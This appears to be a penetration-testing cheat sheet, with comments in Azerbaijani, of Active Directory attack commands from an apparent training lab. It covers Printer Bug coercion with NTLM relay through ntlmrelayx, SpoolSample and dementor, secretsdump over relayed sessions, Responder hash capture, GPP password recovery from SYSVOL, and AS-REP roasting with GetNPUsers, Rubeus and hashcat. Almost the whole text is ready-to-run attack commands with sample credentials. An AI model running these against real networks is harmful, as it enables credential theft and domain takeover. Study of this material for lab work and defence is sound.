# Printer Bug
```
# Bütün şəbəkəni və ya konkret IP-ni yoxlamaq üçün:
nmap --script smb-security-mode.nse -p 445 <Hədəf_IP>

# Şəbəkə daxilində SMB Signing yoxlaması
nxc smb 10.10.10.0/24

python3 smbclient.py -no-pass -query <Hədəf_IP>

# Enumerating for MS-PRN Printer Bug
Import-Module .\SecurityAssessment.ps1
Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL

# Enumerating DNS Records
adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r
```

<img width="900" height="378" alt="image" src="https://github.com/user-attachments/assets/1d9c6443-555b-4304-ac24-9e183b01738b" />

```
# NTLM Relay-i işə salırıq. 
# -t: hədəf (relay ediləcək yer), -smb2support: SMB2 dəstəyi
# socks: gələn əlaqəni SOCKS proxy vasitəsilə idarə etmək üçün (opsional)
ntlmrelayx.py -t smb://HEDEF_SERVER_IP -smb2support -socks

# Sintaksis: SpoolSample.exe <Hədəf_DC> <Sənin_IP_ünvanın>
.\SpoolSample.exe DC01.domain.local 10.10.10.5

# Sintaksis: python3 dementor.py -u <istifadəçi> -p <şifrə> -d <domain> <Sənin_IP> <Hədəf_DC_IP>
python3 dementor.py -u user1 -p Pass123! -d corp.local 10.10.10.5 10.10.10.10

# Relay uğurlu olduqda SOCKS sessiyalarını görmək üçün ntlmrelayx konsolunda:
socks

# Proxychains ilə hədəf maşından məlumatları çəkmək (məsələn, SecretsDump):
proxychains python3 secretsdump.py corp.local/DC01\$@10.10.10.10 -no-pass

# Responder-i dinləmə rejiminə qoyuruq
sudo responder -I eth0 -rdv

# Sonra eyni qaydada Dementor və ya SpoolSample ilə tətikləmə edirik.
# Responder maşın hesabının NTLMv2 hash-ini tutacaq.
```

# PASSWD_NOTREQD
```
Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
```

# SYSVOL 
```
ls \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts

Import-Module .\PowerView.ps1
# Bütün SYSVOL-u gəzib şifrələri tapır və avtomatik dekod edir
Get-GPPPassword

# -M gpp_password modulu vasitəsilə
crackmapexec smb -L | grep gpp
nxc smb 10.10.10.10 -u user -p password -M gpp_password
crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin

gpp-decrypt "Az93S...BURADA_CPASSWORD_OLMALIDIR"
```

# AS-REP Roasting
```
# LDAP Query
ldapsearch -H ldap://10.10.10.10 -x -D "user@corp.local" -w "pass" -b "DC=corp,DC=local" "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" sAMAccountName

# PowerView
Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl

# AD Modulu
Get-ADUser -Filter 'DoesNotRequirePreAuth -eq $True' -Properties DoesNotRequirePreAuth

# Kerbrute Kullanarak AS-REP'i Alma
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt 

# Siyahıdakı istifadəçilər üçün AS-REP hash-lərini çəkmək:
GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users 

# Əgər əlində bir istifadəçi adı və şifrəsi varsa, bütün domain-i skan etmək:
GetNPUsers.py corp.local/istifadechi:shifre -request -format hashcat

# Bütün domain-də pre-auth tələb olunmayan istifadəçiləri tapır və hash-lərini çıxarır
.\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat 

# Şəbəkədəki bütün istifadəçiləri bu boşluğa görə yoxlamaq
nxc smb 10.10.10.10 -u user.txt -p '' --asreproast hashes.txt

# hashes.txt faylındakı hash-i wordlist vasitəsilə sındırmaq
hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt
```


